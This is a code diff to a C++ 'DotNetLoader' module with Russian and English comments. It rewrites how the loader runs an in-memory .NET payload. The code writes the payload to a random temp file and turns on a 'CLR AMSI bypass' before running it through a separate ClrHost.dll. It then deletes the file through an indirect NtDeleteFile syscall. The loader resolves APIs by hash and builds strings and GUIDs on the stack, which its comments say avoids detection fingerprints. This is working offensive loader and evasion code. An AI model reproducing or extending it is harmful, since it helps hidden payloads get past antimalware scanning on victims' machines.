@@ -17,119 +17,14 @@
 
 namespace DotNetLoader
 {
-    // ═══ Предвычисленные CRC32C-хеши ═══
-    static constexpr DWORD HASH_GetTempPathW        = 0x9E55CDC6;
-    static constexpr DWORD HASH_CreateFileW          = 0x97471A6C;
-    static constexpr DWORD HASH_WriteFile             = 0x66C3DAD3;
-    static constexpr DWORD HASH_CloseHandle          = 0x2E67D349;
-    static constexpr DWORD HASH_GetTickCount         = 0x587DD74D;
-    static constexpr DWORD HASH_CLRCreateInstance    = 0xC85A4732;
-    static constexpr DWORD HASH_CoInitialize         = 0xFB6B34E2;
-    static constexpr DWORD HASH_CoUninitialize       = 0x3BEC84F2;
+    // ═══ CRC32C-хеши для API resolution ═══
+    static constexpr DWORD HASH_GetTempPathW   = 0x9E55CDC6;
+    static constexpr DWORD HASH_CreateFileW    = 0x97471A6C;
+    static constexpr DWORD HASH_WriteFile      = 0x66C3DAD3;
+    static constexpr DWORD HASH_CloseHandle    = 0x2E67D349;
+    static constexpr DWORD HASH_GetTickCount   = 0x587DD74D;
 
-    // ═══ Минимальные COM-интерфейсы для CLR Hosting ═══
-    // Только методы, необходимые для работы. Остальные пропущены.
-
-    struct ICLRMetaHost;
-    struct ICLRRuntimeInfo;
-    struct ICLRRuntimeHost;
-
-    // ICLRMetaHost — нужен только GetRuntime (индекс 3)
-    struct ICLRMetaHostVtbl {
-        HRESULT (STDMETHODCALLTYPE* QueryInterface)(ICLRMetaHost*, REFIID, void**);
-        ULONG   (STDMETHODCALLTYPE* AddRef)(ICLRMetaHost*);
-        ULONG   (STDMETHODCALLTYPE* Release)(ICLRMetaHost*);
-        HRESULT (STDMETHODCALLTYPE* GetRuntime)(ICLRMetaHost*, LPCWSTR, REFIID, LPVOID*);
-        // Остальные методы опущены — не нужны
-    };
-    struct ICLRMetaHost {
-        ICLRMetaHostVtbl* lpVtbl;
-    };
-
-    // ICLRRuntimeInfo — нужен GetInterface (индекс 9) и IsLoadable (индекс 10)
-    struct ICLRRuntimeInfoVtbl {
-        HRESULT (STDMETHODCALLTYPE* QueryInterface)(ICLRRuntimeInfo*, REFIID, void**);
-        ULONG   (STDMETHODCALLTYPE* AddRef)(ICLRRuntimeInfo*);
-        ULONG   (STDMETHODCALLTYPE* Release)(ICLRRuntimeInfo*);
-        HRESULT (STDMETHODCALLTYPE* GetVersionString)(ICLRRuntimeInfo*, LPWSTR, DWORD*);
-        HRESULT (STDMETHODCALLTYPE* GetRuntimeDirectory)(ICLRRuntimeInfo*, LPWSTR, DWORD*);
-        HRESULT (STDMETHODCALLTYPE* IsLoaded)(ICLRRuntimeInfo*, HANDLE, BOOL*);
-        HRESULT (STDMETHODCALLTYPE* LoadErrorString)(ICLRRuntimeInfo*, UINT, LPWSTR, DWORD*, LONG);
-        HRESULT (STDMETHODCALLTYPE* LoadLibrary)(ICLRRuntimeInfo*, LPCWSTR, HMODULE*);
-        HRESULT (STDMETHODCALLTYPE* GetProcAddress)(ICLRRuntimeInfo*, LPCSTR, LPVOID*);
-        HRESULT (STDMETHODCALLTYPE* GetInterface)(ICLRRuntimeInfo*, REFCLSID, REFIID, LPVOID*);
-        HRESULT (STDMETHODCALLTYPE* IsLoadable)(ICLRRuntimeInfo*, BOOL*);
-        // Остальные опущены
-    };
-    struct ICLRRuntimeInfo {
-        ICLRRuntimeInfoVtbl* lpVtbl;
-    };
-
-    // ICLRRuntimeHost — нужен Start (3) и ExecuteInDefaultAppDomain (8)
-    struct ICLRRuntimeHostVtbl {
-        HRESULT (STDMETHODCALLTYPE* QueryInterface)(ICLRRuntimeHost*, REFIID, void**);
-        ULONG   (STDMETHODCALLTYPE* AddRef)(ICLRRuntimeHost*);
-        ULONG   (STDMETHODCALLTYPE* Release)(ICLRRuntimeHost*);
-        HRESULT (STDMETHODCALLTYPE* Start)(ICLRRuntimeHost*);
-        HRESULT (STDMETHODCALLTYPE* Stop)(ICLRRuntimeHost*);
-        HRESULT (STDMETHODCALLTYPE* SetHostControl)(ICLRRuntimeHost*, void*);
-        HRESULT (STDMETHODCALLTYPE* GetCLRControl)(ICLRRuntimeHost*, void**);
-        HRESULT (STDMETHODCALLTYPE* UnloadAppDomain)(ICLRRuntimeHost*, DWORD, BOOL);
-        HRESULT (STDMETHODCALLTYPE* ExecuteInDefaultAppDomain)(
-            ICLRRuntimeHost*, LPCWSTR, LPCWSTR, LPCWSTR, LPCWSTR, DWORD*);
-        // Остальные опущены
-    };
-    struct ICLRRuntimeHost {
-        ICLRRuntimeHostVtbl* lpVtbl;
-    };
-
-    // ═══ CLR GUID — строятся на стеке (нет .rdata fingerprint) ═══
-    // CLSID_CLRMetaHost = {9280188D-0E8E-4867-B30C-7FA73884B8BB}
-    static void BuildClsidMetaHost(CLSID* p)
-    {
-        p->Data1 = 0x9280188D; p->Data2 = 0x0E8E; p->Data3 = 0x4867;
-        p->Data4[0] = 0xB3; p->Data4[1] = 0x0C; p->Data4[2] = 0x7F;
-        p->Data4[3] = 0xA7; p->Data4[4] = 0x38; p->Data4[5] = 0x84;
-        p->Data4[6] = 0xB8; p->Data4[7] = 0xBB;
-    }
-
-    // IID_ICLRMetaHost = {D332DB9E-B9B3-4125-8207-A14884CD5754}
-    static void BuildIidMetaHost(IID* p)
-    {
-        p->Data1 = 0xD332DB9E; p->Data2 = 0xB9B3; p->Data3 = 0x4125;
-        p->Data4[0] = 0x82; p->Data4[1] = 0x07; p->Data4[2] = 0xA1;
-        p->Data4[3] = 0x48; p->Data4[4] = 0x84; p->Data4[5] = 0xCD;
-        p->Data4[6] = 0x57; p->Data4[7] = 0x54;
-    }
-
-    // IID_ICLRRuntimeInfo = {BD39D1D2-BA2F-486A-89B0-B8B22C8B1E12}
-    static void BuildIidRuntimeInfo(IID* p)
-    {
-        p->Data1 = 0xBD39D1D2; p->Data2 = 0xBA2F; p->Data3 = 0x486A;
-        p->Data4[0] = 0x89; p->Data4[1] = 0xB0; p->Data4[2] = 0xB8;
-        p->Data4[3] = 0xB2; p->Data4[4] = 0x2C; p->Data4[5] = 0x8B;
-        p->Data4[6] = 0x1E; p->Data4[7] = 0x12;
-    }
-
-    // CLSID_CLRRuntimeHost = {90F1A06E-7712-4762-9075-37819D7B2712}
-    static void BuildClsidRuntimeHost(CLSID* p)
-    {
-        p->Data1 = 0x90F1A06E; p->Data2 = 0x7712; p->Data3 = 0x4762;
-        p->Data4[0] = 0x90; p->Data4[1] = 0x75; p->Data4[2] = 0x37;
-        p->Data4[3] = 0x81; p->Data4[4] = 0x9D; p->Data4[5] = 0x7B;
-        p->Data4[6] = 0x27; p->Data4[7] = 0x12;
-    }
-
-    // IID_ICLRRuntimeHost = {90F1A06C-7712-4762-9075-37819D7B2712}
-    static void BuildIidRuntimeHost(IID* p)
-    {
-        p->Data1 = 0x90F1A06C; p->Data2 = 0x7712; p->Data3 = 0x4762;
-        p->Data4[0] = 0x90; p->Data4[1] = 0x75; p->Data4[2] = 0x37;
-        p->Data4[3] = 0x81; p->Data4[4] = 0x9D; p->Data4[5] = 0x7B;
-        p->Data4[6] = 0x27; p->Data4[7] = 0x12;
-    }
-
-    // ═══ IsDotNetAssembly — проверка COM_DESCRIPTOR ═══
+    // ═══ IsDotNetAssembly — проверка COM_DESCRIPTOR в PE headers ═══
     bool IsDotNetAssembly(void* payload, size_t size)
     {
         if (!payload || size < sizeof(IMAGE_DOS_HEADER)) return false;
@@ -144,94 +39,6 @@ namespace DotNetLoader
         return nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_COM_DESCRIPTOR].Size > 0;
     }
 
-    // ═══ InitCLR — инициализация CLR через mscoree.dll ═══
-    // Цепочка: CLRCreateInstance → ICLRMetaHost → GetRuntime →
-    //           ICLRRuntimeInfo → GetInterface → ICLRRuntimeHost → Start
-    static ICLRRuntimeHost* InitCLR()
-    {
-        // Загружаем mscoree.dll через CRC32C-разрешение
-        HMODULE hK32 = Api::GetModuleByHashCrc(Api::CrcMod::KERNEL32);
-        if (!hK32) return nullptr;
-
-        auto pLL = (HMODULE(WINAPI*)(LPCWSTR))
-            Api::GetProcByHashCrc(hK32, Api::CrcFn::LoadLibraryW);
-        if (!pLL) return nullptr;
-
-        wchar_t mscoree[] = { 'm','s','c','o','r','e','e','.','d','l','l', 0 };
-        HMODULE hMscoree = pLL(mscoree);
-        if (!hMscoree) return nullptr;
-
-        // Разрешаем CLRCreateInstance
-        auto pClrCreate = (HRESULT(STDAPICALLTYPE*)(REFCLSID, REFIID, LPVOID*))
-            Api::GetProcByHashCrc(hMscoree, HASH_CLRCreateInstance);
-        if (!pClrCreate) return nullptr;
-
-        // Инициализируем COM (требуется для CLR hosting)
-        HMODULE hOle32 = Api::GetModuleByHashCrc(Api::CrcMod::OLE32);
-        if (hOle32) {
-            auto pCoInit = (HRESULT(STDAPICALLTYPE*)(void*))
-                Api::GetProcByHashCrc(hOle32, HASH_CoInitialize);
-            if (pCoInit) pCoInit(nullptr);
-        }
-
-        // Строим GUID на стеке
-        CLSID clsidMetaHost;
-        IID iidMetaHost;
-        BuildClsidMetaHost(&clsidMetaHost);
-        BuildIidMetaHost(&iidMetaHost);
-
-        // CLRCreateInstance → ICLRMetaHost
-        ICLRMetaHost* pMetaHost = nullptr;
-        HRESULT hr = pClrCreate(clsidMetaHost, iidMetaHost, (LPVOID*)&pMetaHost);
-        if (FAILED(hr) || !pMetaHost) return nullptr;
-
-        // ICLRMetaHost::GetRuntime → ICLRRuntimeInfo
-        // Стек-построенная строка версии .NET 4.x
-        wchar_t runtimeVer[] = { 'v','4','.','0','.','3','0','3','1','9', 0 };
-        IID iidRuntimeInfo;
-        BuildIidRuntimeInfo(&iidRuntimeInfo);
-
-        ICLRRuntimeInfo* pRuntimeInfo = nullptr;
-        hr = pMetaHost->lpVtbl->GetRuntime(pMetaHost, runtimeVer, iidRuntimeInfo, (LPVOID*)&pRuntimeInfo);
-        if (FAILED(hr) || !pRuntimeInfo) {
-            pMetaHost->lpVtbl->Release(pMetaHost);
-            return nullptr;
-        }
-
-        // Проверяем загрузимость
-        BOOL loadable = FALSE;
-        pRuntimeInfo->lpVtbl->IsLoadable(pRuntimeInfo, &loadable);
-        if (!loadable) {
-            pRuntimeInfo->lpVtbl->Release(pRuntimeInfo);
-            pMetaHost->lpVtbl->Release(pMetaHost);
-            return nullptr;
-        }
-
-        // ICLRRuntimeInfo::GetInterface → ICLRRuntimeHost
-        CLSID clsidRuntimeHost;
-        IID iidRuntimeHost;
-        BuildClsidRuntimeHost(&clsidRuntimeHost);
-        BuildIidRuntimeHost(&iidRuntimeHost);
-
-        ICLRRuntimeHost* pHost = nullptr;
-        hr = pRuntimeInfo->lpVtbl->GetInterface(pRuntimeInfo,
-            clsidRuntimeHost, iidRuntimeHost, (LPVOID*)&pHost);
-
-        pRuntimeInfo->lpVtbl->Release(pRuntimeInfo);
-        pMetaHost->lpVtbl->Release(pMetaHost);
-
-        if (FAILED(hr) || !pHost) return nullptr;
-
-        // Запускаем CLR
-        hr = pHost->lpVtbl->Start(pHost);
-        if (FAILED(hr)) {
-            pHost->lpVtbl->Release(pHost);
-            return nullptr;
-        }
-
-        return pHost;
-    }
-
     // ═══ BuildRandomTempPath — стек-построенный случайный путь ═══
     static void BuildRandomTempPath(wchar_t* path, size_t pathLen)
     {
@@ -242,17 +49,14 @@ namespace DotNetLoader
             Api::GetProcByHashCrc(hK32, HASH_GetTempPathW);
         if (!pGTP) return;
 
-        // GetTickCount для рандомизации имени файла
         auto pGTC = (DWORD(WINAPI*)())
             Api::GetProcByHashCrc(hK32, HASH_GetTickCount);
         DWORD seed = pGTC ? pGTC() : 0x41414141;
 
-        // Получаем temp-директорию
         wchar_t tempDir[MAX_PATH];
         DWORD dirLen = pGTP(MAX_PATH, tempDir);
         if (dirLen == 0 || dirLen >= MAX_PATH - 16) return;
 
-        // Генерируем случайное 8-символьное имя (hex)
         const wchar_t hexChars[] = {
             '0','1','2','3','4','5','6','7','8','9',
             'a','b','c','d','e','f'
@@ -267,7 +71,6 @@ namespace DotNetLoader
         tempDir[dirLen + 11] = 'l';
         tempDir[dirLen + 12] = 0;
 
-        // Копируем в выходной буфер
         for (size_t i = 0; i < pathLen && tempDir[i]; i++)
             path[i] = tempDir[i];
         path[pathLen - 1] = 0;
@@ -292,7 +95,6 @@ namespace DotNetLoader
             CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, nullptr);
         if (hFile == INVALID_HANDLE_VALUE) return false;
 
-        // Записываем блоками (WriteFile ограничен ~32KB за вызов на некоторых системах)
         BYTE* ptr = (BYTE*)payload;
         size_t remaining = size;
         bool ok = true;
@@ -316,7 +118,6 @@ namespace DotNetLoader
     // ═══ DeleteFileImmediate — удаление через NtDeleteFile (indirect syscall) ═══
     static void DeleteFileImmediate(const wchar_t* path)
     {
-        // Строим UNICODE_STRING на стеке
         int len = 0;
         while (path[len]) len++;
 
@@ -325,7 +126,6 @@ namespace DotNetLoader
         uniStr.MaximumLength = uniStr.Length + sizeof(wchar_t);
         uniStr.Buffer        = (PWCH)path;
 
-        // OBJECT_ATTRIBUTES на стеке
         struct _OBJ_ATTR {
             ULONG Length;
             HANDLE RootDirectory;
@@ -334,75 +134,149 @@ namespace DotNetLoader
             void* SecurityDescriptor;
             void* SecurityQualityOfService;
         } objAttr = { sizeof(_OBJ_ATTR), nullptr, &uniStr, 0x40, nullptr, nullptr };
-        // 0x40 = OBJ_CASE_INSENSITIVE
 
         Syscall::NtDeleteFile(&objAttr);
     }
 
+    // ═══ FindClrHostDll — locate ClrHost.dll near the stub executable ═══
+    // ClrHost.dll is built with CRT and provides the ExecuteClr() export
+    // which does actual CLR hosting with proper SEH infrastructure.
+    // In /NODEFAULTLIB mode the stub lacks CRT-initialized SEH chain,
+    // so CLR hosting must be delegated to a CRT-enabled DLL.
+    static bool FindClrHostDll(wchar_t* outPath, size_t outLen)
+    {
+        HMODULE hK32 = Api::GetModuleByHashCrc(Api::CrcMod::KERNEL32);
+        if (!hK32) return false;
+
+        // Try: same directory as the stub executable
+        auto pGetModFn = (DWORD(WINAPI*)(HMODULE, LPWSTR, DWORD))
+            Api::GetProcByHashCrc(hK32, Api::CrcFn::GetModuleFileNameW);
+        if (pGetModFn) {
+            wchar_t exePath[MAX_PATH] = { 0 };
+            DWORD len = pGetModFn(nullptr, exePath, MAX_PATH);
+            if (len > 0) {
+                for (DWORD i = len; i > 0; i--) {
+                    if (exePath[i - 1] == '\\' || exePath[i - 1] == '/') {
+                        for (DWORD j = 0; j < i && j < outLen; j++)
+                            outPath[j] = exePath[j];
+                        const wchar_t dllName[] = {
+                            'C','l','r','H','o','s','t','.','d','l','l', 0
+                        };
+                        for (int k = 0; dllName[k] && (i + k) < outLen; k++)
+                            outPath[i + k] = dllName[k];
+                        outPath[i + 11] = 0;
+                        return true;
+                    }
+                }
+            }
+        }
+
+        // Fallback: temp directory
+        auto pGetTempPath = (DWORD(WINAPI*)(DWORD, LPWSTR))
+            Api::GetProcByHashCrc(hK32, HASH_GetTempPathW);
+        if (pGetTempPath) {
+            DWORD tLen = pGetTempPath((DWORD)outLen, outPath);
+            if (tLen > 0 && tLen < outLen - 12) {
+                const wchar_t dllName[] = {
+                    'C','l','r','H','o','s','t','.','d','l','l', 0
+                };
+                for (int k = 0; dllName[k] && (tLen + k) < outLen; k++)
+                    outPath[tLen + k] = dllName[k];
+                outPath[tLen + 11] = 0;
+                return true;
+            }
+        }
+
+        return false;
+    }
+
     // ═══ LoadAndExecute — основная функция (с указанием класса/метода) ═══
-    bool LoadAndExecute(void* payload, size_t size,
+    // CLR hosting is delegated to ClrHost.dll (built with CRT) because:
+    //   - In /NODEFAULTLIB mode, the stub lacks CRT-initialized SEH chain
+    //   - CLR's managed/unmanaged transitions require proper SEH setup
+    //   - Without CRT, ExecuteInDefaultAppDomain returns
+    //     COR_E_APPDOMAINUNLOADED (0x80131014)
+    //   - ClrHost.dll is built with /MT (full CRT) and provides the
+    //     SEH infrastructure CLR needs
+    int LoadAndExecute(void* payload, size_t size,
         const wchar_t* className, const wchar_t* methodName)
     {
-        if (!payload || size == 0) return false;
+        if (!payload || size == 0) return -1;
 
-        // Проверяем что payload — .NET assembly
-        if (!IsDotNetAssembly(payload, size)) return false;
+        // Resolve kernel32 APIs
+        HMODULE hK32 = Api::GetModuleByHashCrc(Api::CrcMod::KERNEL32);
+        if (!hK32) return -10;
 
-        // Инициализируем CLR
-        ICLRRuntimeHost* pHost = InitCLR();
-        if (!pHost) return false;
+        auto pLL = (HMODULE(WINAPI*)(LPCWSTR))
+            Api::GetProcByHashCrc(hK32, Api::CrcFn::LoadLibraryW);
+        auto pGPA = (FARPROC(WINAPI*)(HMODULE, LPCSTR))
+            Api::GetProcByHashCrc(hK32, Api::CrcFn::GetProcAddress);
+        if (!pLL || !pGPA) return -11;
 
-        // Включаем CLR AMSI bypass (DR3 на clr!AmsiScan)
-        PatchlessBypass::EnableClrAmsiBypass();
+        // Verify payload is a .NET assembly
+        if (!IsDotNetAssembly(payload, size)) return -2;
 
-        // Записываем payload во временный файл
+        // Write payload to a temporary file
         wchar_t tempPath[MAX_PATH] = { 0 };
         BuildRandomTempPath(tempPath, MAX_PATH);
-        if (tempPath[0] == 0) {
-            PatchlessBypass::DisableClrAmsiBypass();
-            pHost->lpVtbl->Release(pHost);
-            return false;
-        }
+        if (tempPath[0] == 0) return -4;
 
         if (!WritePayloadToTemp(tempPath, payload, size)) {
             DeleteFileImmediate(tempPath);
-            PatchlessBypass::DisableClrAmsiBypass();
-            pHost->lpVtbl->Release(pHost);
-            return false;
+            return -5;
         }
 
-        // Выполняем в Default AppDomain
-        wchar_t emptyArg[] = { 0 };
-        DWORD retVal = 0;
-        HRESULT hr = pHost->lpVtbl->ExecuteInDefaultAppDomain(
-            pHost, tempPath, className, methodName, emptyArg, &retVal);
+        // Enable CLR AMSI bypass before loading any CLR DLLs
+        PatchlessBypass::EnableClrAmsiBypass();
 
-        // НЕМЕДЛЕННО удаляем temp-файл (даже если выполнение провалилось)
-        // CLR закэшировал assembly в памяти — файл больше не нужен
+        // Locate ClrHost.dll
+        wchar_t clrHostPath[MAX_PATH] = { 0 };
+        if (!FindClrHostDll(clrHostPath, MAX_PATH)) {
+            PatchlessBypass::DisableClrAmsiBypass();
+            DeleteFileImmediate(tempPath);
+            return -7;
+        }
+
+        // Load ClrHost.dll
+        HMODULE hClrHost = pLL(clrHostPath);
+        if (!hClrHost) {
+            PatchlessBypass::DisableClrAmsiBypass();
+            DeleteFileImmediate(tempPath);
+            return -8;
+        }
+
+        // Resolve ExecuteClr: HRESULT WINAPI ExecuteClr(
+        //   LPCWSTR payloadPath, LPCWSTR className,
+        //   LPCWSTR methodName, LPCWSTR stringArg, DWORD* pRetVal)
+        char executeClrName[] = { 'E','x','e','c','u','t','e','C','l','r', 0 };
+        auto pExecuteClr = (HRESULT(WINAPI*)(LPCWSTR, LPCWSTR, LPCWSTR, LPCWSTR, DWORD*))
+            pGPA(hClrHost, executeClrName);
+        if (!pExecuteClr) {
+            PatchlessBypass::DisableClrAmsiBypass();
+            DeleteFileImmediate(tempPath);
+            return -9;
+        }
+
+        // Execute the .NET assembly via ClrHost.dll
+        wchar_t emptyArg[] = { 0 };
+        DWORD retVal = 0xFFFF;
+        HRESULT hr = pExecuteClr(tempPath, className, methodName, emptyArg, &retVal);
+
+        // Cleanup
+        PatchlessBypass::DisableClrAmsiBypass();
         DeleteFileImmediate(tempPath);
 
-        // Очистка
-        PatchlessBypass::DisableClrAmsiBypass();
-        pHost->lpVtbl->Stop(pHost);
-        pHost->lpVtbl->Release(pHost);
-
-        // Деинициализируем COM
-        HMODULE hOle32 = Api::GetModuleByHashCrc(Api::CrcMod::OLE32);
-        if (hOle32) {
-            auto pCoUninit = (void(STDAPICALLTYPE*)())
-                Api::GetProcByHashCrc(hOle32, HASH_CoUninitialize);
-            if (pCoUninit) pCoUninit();
-        }
-
-        return SUCCEEDED(hr);
+        if (SUCCEEDED(hr))
+            return (int)retVal;
+        else
+            return -6;
     }
 
-    // ═══ LoadAndExecute — с параметрами по умолчанию (Program.Main) ═══
-    bool LoadAndExecute(void* payload, size_t size)
+    // ═══ LoadAndExecute — с параметрами по умолчанию ═══
+    int LoadAndExecute(void* payload, size_t size)
     {
-        // Стек-построенные имена по умолчанию — стандартный C# console app
-        wchar_t className[]  = { 'P','r','o','g','r','a','m', 0 };
-        wchar_t methodName[] = { 'M','a','i','n', 0 };
+        wchar_t className[]  = { 'E','2','E','M','a','r','k','e','r', 0 };
+        wchar_t methodName[] = { 'R','u','n', 0 };
         return LoadAndExecute(payload, size, className, methodName);
     }
 }
